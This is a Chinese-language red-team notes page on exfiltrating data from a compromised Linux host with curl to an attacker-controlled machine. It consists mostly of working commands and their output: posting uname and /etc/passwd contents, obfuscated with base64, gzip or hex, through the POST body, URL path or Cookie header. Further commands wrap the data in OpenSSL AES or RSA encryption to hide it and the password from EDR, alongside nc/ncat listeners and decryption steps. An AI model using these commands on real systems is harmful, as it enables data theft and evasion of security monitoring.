up::[[Red Team能力建设]]-[[初始访问 Initial Access]]-[[数据外传 Exfiltration]]
- # 基本形式
	```
	  受控机
	  curl -d `uname -a` http://attacker_system/
	  
	  接收机
	  nc -lp 80
	  POST / HTTP/1.1
	  Host: attacker_system
	  User-Agent: curl/7.68.0
	  Accept: */*
	  Content-Length: 31
	  Content-Type: application/x-www-form-urlencoded
	  
	  Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
	  
	```
- # 各种混淆
	```
	  受控机
	  curl -d `cat /etc/passwd | base64 -w0` http://attacker_system/
	  curl http://attacker_system/`uname -a | base64 -w0`
	  curl http://attacker_system/ -H  "Cookie: `uname -a | base64 -w0`"
	  curl -d `uname -a | gzip | base64 -w0` http://attacker_system
	  curl -d `uname -a | gzip | xxd -ps | tr -d '\n'` http://attacker_system/
	```
- # OpenSSL加密
	```
	  受控机
	  curl -d `uname -a | openssl enc -pass 'pass:EncryptMe' -md sha256 -aes-256-cbc -pbkdf2 -a -e` http://attacker_system/
	  
	  接收机
	  nc -lp 80
	  POST / HTTP/1.1
	  Host: attacker_system
	  User-Agent: curl/7.68.0
	  Accept: */*
	  Content-Length: 172
	  Content-Type: application/x-www-form-urlencoded
	  
	  U2FsdGVkX18/C90HEEv7tvzvU7JM/FRUQ9cGlhC5QporjmRYBwMLNc/VBbrOQFqp6GPQRu1T99GfwZUwDgOU8sItii//UAs4WoAxpVRcAg3cHOYKJ+ZUA3X4lS2Af/2J3zPKHeL6E3559Ife9X0hBk5zjfSfmFM00es2DTVYm+Q=
	```
	- 如上所示，我们使用curlPOST 对uname -a 进行数据外传，使用管道将 stdout 发送到openssl，使用密码加密。但需要注意的是，这种方法会在进程树的命令行参数中显示密码，某些EDR可能会捕获这些参数以供以后分析。最后，我们对输出进行base64编码并发送请求。以下是openssl的一些参数解释：
	- enc该命令允许我们使用密码来加密数据。
	- -pass该参数允许我们指定密码来加密数据。
	- -md用于从提供的密码创建密钥的消息摘要算法。OpenSSL 可能会根据安装默认使用不同的消息摘要算法，为了避免解密出现问题，最好专门设置此参数。
	- -aes-256-cbc我们希望用来加密数据的算法。
	- -pbkdf2使用具有默认迭代次数（通常为 10000 次迭代）的 PBKDF2 算法。这是一个比默认选项 openssl 提供的更安全的密钥派生过程。需要注意的是，这个标志只在 OpenSSL >= 1.1.1 中可用。
	- -a将输出编码为 Base64。这让我们可以base64 -w0像之前所做的那样跳过管道。
	- -e最后，这个标志告诉 openssl 加密传递给它的数据。在这种情况下，数据来自标准输入。
	- 使用以下方法进行解密
		```
		  openssl enc -pass 'pass:EncryptMe' -md sha256 -aes-256-cbc -pbkdf2 -a -d <<< U2FsdGVkX18/C90HEEv7tvzvU7JM/FRUQ9cGlhC5QporjmRYBwMLNc/VBbrOQFqp6GPQRu1T99GfwZUwDgOU8sItii//UAs4WoAxpVRcAg3cHOYKJ+ZUA3X4lS2Af/2J3zPKHeL6E3559Ife9X0hBk5zjfSfmFM00es2DTVYm+Q= 
		  Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
		 ```
- # 那么如何将进程树命令行参数中的密码隐藏呢？我们可以使用自己的公钥进行加密
	```
	  受控机
	  curl -k -d `openssl s_client -connect attacker_system:443 \
	  | openssl x509 -pubkey -noout  > /tmp/f; uname -a \
	  | openssl rsautl -inkey /tmp/f -pubin -encrypt \
	  | base64 -w0; rm /tmp/f` https://attacker_system/
	  
	  接收机
	  ncat -lp 443 -k --ssl --ssl-cert pub.crt --ssl-key priv.key
	  POST / HTTP/1.1
	  Host: attacker_system
	  User-Agent: curl/7.68.0
	  Accept: */*
	  Content-Length: 344
	  Content-Type: application/x-www-form-urlencoded
	  
	  HmuUgK05Sku7xBjBkxDeakgDnb9CkJIX5EYIC1oxOnSHxBzVG9hGh4BQeX9VwEp5OYxLX8mRNXCxmbHANdwy3/Bga4Mp+GFVhUZKr8haKHVrNa1dtfEvHlmDaMfESwcZy0Llmvl8+skOescVb6lSZLS/09HIAVdfyQo5DFM59KKGm9XZEMsXUAvR+1AmB5nsvIAKqBQY1nyr5IJc6+pzSK8d1gxTCTL/0D9gM2xnr6ZXmgthPogH2dy8olZLlYT+q6J/3ZpDijm1W4LyKZHO0WLjdS0mem9to/6GAi8cWZTySV+BvddF3jmkA8lfgOtL09JpjC9QrJ5sT7Ay+vDWuA==
	 ```
- 这次使用`ncat`是为了使用其内置的 SSL 解密功能进行解密，相关参数解释如下：
	- 从攻击系统中提取公钥并保存到文件中openssl s_client -connect attacker_system:443 | openssl x509 -pubkey -noout > /tmp/f
	- 执行所需的命令并使用 OpenSSL 和之前提取的公钥进行加密，然后对数据进行 base64 编码uname -a | openssl rsautl -inkey /tmp/f -pubin -encrypt | base64 -w0;
	- 删除包含公钥的文件rm /tmp/f
	- curl通过 HTTPS 将命令中的 base64 输出发布到攻击系统。
- 我们现在可以像这样解码和解密结果：
	```
	  base64 -d <<< SxYwWIC7ceUtsPGo3ETSPaCTMW9AdXWuyAR01AIBu0LLlHWDVa5uSP3J86vyyePaoybuoAEgvit5HQDNfL8fS1lSix/enb9UVCAn7hp/dZ9RGrtzqIRWFgHm0O4M69S1bHT1bn/3F0EiCZ53blulegKnxaCmSM64aO6c12dpJWD7A8QcJwG4R5J/owE9LbR5rJkmvTCf3bAD9FkvX5vD8GJmJkLhjaYa+mB6VZ67FcJdzUykfGJPsWOg5ju8nCTasxgjPR7Wsv7EXRoV7uia9u1yjfIpb5DloR2lqhfihvs4vuCmm23pJNZyIikSL0FyOGgQSps21mP0ri3UfRIryw== \
	      | openssl rsautl -inkey priv.key -decrypt
	      
	  Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
	```
- # 参考
	- https://medium.com/maverislabs/bash-tricks-for-command-execution-and-data-extraction-over-http-s-ca76e9c80933